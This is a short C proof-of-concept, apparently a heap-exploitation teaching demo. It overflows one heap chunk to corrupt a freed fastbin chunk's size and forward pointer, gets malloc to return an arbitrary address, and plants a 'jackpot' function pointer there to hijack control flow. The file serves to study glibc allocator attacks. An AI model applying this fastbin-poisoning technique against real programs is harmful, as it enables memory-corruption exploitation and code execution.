#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void jackpot() { puts("jackpot!"); }

int main()
{
    void *arbitrary_address = (void*)(0x4141414141414141);

    puts("\n[+] allocate p1");
    char *p1 = malloc(0x100);
    printf("p1 = %p\n", p1);

    puts("\n[+] allocate p2 with size 0x60");
    char *p2 = malloc(0x60); // Fastchunk
    printf("p2 = %p\n", p2);

    puts("\n[+] free p2");
    free(p2);

    puts("\n[+] abuse p1 overflow");
    memset(p1, 'A', 0x100);
    *(void **)(p1+0x108) = (void*)0x71;
    *(void **)(p1+0x110) = (void *)(arbitrary_address);

    puts("\n[+] allocate p3, p4 with size 0x60");
    char *p3 = malloc(0x60);
    char *p4 = malloc(0x60);
    printf("p3 = %p\n", p3);
    printf("p4 = %p\n", p4);

    puts("\n[+] overwrite *(p4+0x13) = arbitrary_address");
    memset(p4, 'A', 0x13);
    *(void **)(p4+0x13) = jackpot;

    puts("\n[+] allocate p5");
    char *p5 = malloc(0x100);
    printf("p5 = %p\n", p5);

    return 0;
}
